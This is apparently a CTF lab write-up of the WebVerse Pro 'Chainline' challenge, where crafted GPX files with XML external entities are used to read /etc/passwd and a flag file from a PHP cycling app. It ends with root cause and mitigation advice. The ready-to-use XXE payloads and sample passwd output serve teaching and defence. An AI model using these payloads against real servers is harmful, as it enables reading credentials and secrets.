---
title: "XXE Leads to Local File Disclosure | Chainline"
date: 2026-07-09 15:40:00 +0530
categories: [A05 - Injection, XML External Entity]
tags: [xxe, xml-external-entity, file-disclosure, gpx-upload, webverse-pro]
platform: WebVerse Pro
author: Shivansh Sharma
image:
  path: /assets/images/posts/chainline-xxe.webp
  alt: "Chainline XXE local file disclosure"
---

## Lab Link

[Chainline](https://dashboard.webverselabs-pro.com/mystery-challenges/chainline)

---

## Overview

**Chainline** was a WebVerse Pro challenge based on a cycling tracker application that allowed users to import ride data using GPX files.

The challenge briefing hinted that the application trusted a file uploaded from the user's device. Since GPX is an XML-based format, the import feature became the main target. By supplying a crafted GPX file containing an external entity declaration, the backend XML parser expanded the entity and embedded local file contents into the imported ride description.

This resulted in **XML External Entity (XXE)** exploitation and allowed reading sensitive files from the server, including the flag file.

---

## Objective

The objective was to exploit the GPX import functionality and retrieve the challenge flag.

The successful attack path was:

1. Register and log in with a normal user account.
2. Access the GPX import feature.
3. Import a valid GPX file to understand how ride data is rendered.
4. Inject an external XML entity into the GPX content.
5. Confirm local file disclosure using `/etc/passwd`.
6. Read `/flag.txt` through the same XXE primitive.

---

## Vulnerability Identification

The application provided an import page for uploading or pasting GPX data.

GPX files are XML documents. This made the parser behavior important because insecure XML parsers may process `DOCTYPE` declarations and resolve external entities.

A normal GPX import succeeded and redirected to a ride page:

```http
POST /import.php HTTP/2
Host: <challenge-host>
Content-Type: application/x-www-form-urlencoded
Cookie: <session-cookie>

gpx_text=<valid-gpx-data>
```

The application redirected to a newly created ride page:

```http
HTTP/2 302 Found
Location: /ride.php?id=7
```

The imported GPX metadata fields, including the ride name and description, were rendered back on the ride page. That reflection point was useful for checking whether entity expansion occurred.

---

## Recon and Approach

The initial recon showed a PHP application with an import endpoint:

```text
/import.php
/ride.php?id=<id>
```

The import page supported GPX input. A minimal valid GPX file was submitted first to confirm the expected structure:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<gpx version="1.1" creator="Chainline" xmlns="http://www.topografix.com/GPX/1/1">
  <metadata>
    <name>Normal Probe</name>
    <desc>normal import</desc>
    <time>2026-07-09T10:05:00Z</time>
  </metadata>
  <trk>
    <name>Normal Probe</name>
    <desc>normal import</desc>
    <trkseg>
      <trkpt lat="53.48010" lon="-2.24230">
        <ele>41</ele>
        <time>2026-07-09T10:05:00Z</time>
      </trkpt>
      <trkpt lat="53.48420" lon="-2.25510">
        <ele>46</ele>
        <time>2026-07-09T10:10:00Z</time>
      </trkpt>
    </trkseg>
  </trk>
</gpx>
```

After import, the ride page reflected the `name` and `desc` fields. This confirmed that an XXE payload could be placed inside the description field and observed after import.

---

## Exploitation

To test for XXE, an external entity was declared in the GPX file and referenced inside the ride description.

The first safe proof was reading `/etc/passwd`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE gpx [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<gpx version="1.1" creator="Chainline" xmlns="http://www.topografix.com/GPX/1/1">
  <metadata>
    <name>XXE Probe</name>
    <desc>&xxe;</desc>
    <time>2026-07-09T10:08:00Z</time>
  </metadata>
  <trk>
    <name>XXE Probe</name>
    <desc>&xxe;</desc>
    <trkseg>
      <trkpt lat="53.48010" lon="-2.24230">
        <ele>41</ele>
        <time>2026-07-09T10:08:00Z</time>
      </trkpt>
      <trkpt lat="53.48420" lon="-2.25510">
        <ele>46</ele>
        <time>2026-07-09T10:13:00Z</time>
      </trkpt>
    </trkseg>
  </trk>
</gpx>
```

The import succeeded and created a new ride record.

When the ride page was opened, the description contained local server file contents such as:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

This confirmed that the XML parser was resolving local external entities.

The final payload changed the entity target to `/flag.txt`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE gpx [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<gpx version="1.1" creator="Chainline" xmlns="http://www.topografix.com/GPX/1/1">
  <metadata>
    <name>Flag Read</name>
    <desc>&xxe;</desc>
    <time>2026-07-09T10:10:00Z</time>
  </metadata>
  <trk>
    <name>Flag Read</name>
    <desc>&xxe;</desc>
    <trkseg>
      <trkpt lat="53.48010" lon="-2.24230">
        <ele>41</ele>
        <time>2026-07-09T10:10:00Z</time>
      </trkpt>
      <trkpt lat="53.48420" lon="-2.25510">
        <ele>46</ele>
        <time>2026-07-09T10:15:00Z</time>
      </trkpt>
    </trkseg>
  </trk>
</gpx>
```

The rendered ride description returned the contents of the flag file.

---

## Proof / Flag

The flag was successfully read from:

```text
/flag.txt
```

Flag:

```text
WEBVERSE{REDACTED}
```

The flag was redacted in the writeup to avoid publishing the live challenge secret.

---

## Root Cause

The root cause was insecure XML parsing of user-supplied GPX data.

The application accepted GPX input and passed it to an XML parser that allowed:

- `DOCTYPE` declarations
- external entity definitions
- local file entity resolution

Because the parsed XML fields were later rendered into the ride page, the attacker could use the application itself as a file disclosure oracle.

---

## Impact

An attacker with a normal account could read arbitrary local files accessible to the web application process.

Potential impact includes:

- disclosure of `/etc/passwd`
- disclosure of application source files
- disclosure of environment files or secrets
- disclosure of internal configuration
- retrieval of challenge flag or production credentials

In a real-world application, this could lead to credential theft, source code exposure, lateral movement, or further compromise depending on file permissions and deployed secrets.

---

## Mitigation

To prevent this issue:

- Disable external entity resolution in the XML parser.
- Disable `DOCTYPE` processing unless strictly required.
- Use a secure XML parser configuration for GPX imports.
- Prefer a GPX parsing library that is hardened against XXE by default.
- Validate uploaded GPX files against a strict schema.
- Reject XML files containing `DOCTYPE` declarations.
- Run the application with least-privilege file permissions.
- Keep secrets outside paths readable by the web application user.

Example defensive rule:

```text
Reject GPX input containing <!DOCTYPE or external entity declarations.
```

However, input filtering should only be a secondary defense. The primary fix should be secure XML parser configuration.

---

## Lessons

This challenge shows why file upload features should be reviewed based on the file format, not just the file extension.

GPX looks like a simple fitness tracking format, but it is XML under the hood. If the parser is misconfigured, a harmless-looking ride import can become an arbitrary file read vulnerability.

Key takeaways:

- GPX import features are XML parsing features.
- XML parsers must be hardened before processing user input.
- Reflected imported metadata can become an easy XXE output channel.
- Always test XML upload flows with controlled external entity payloads.
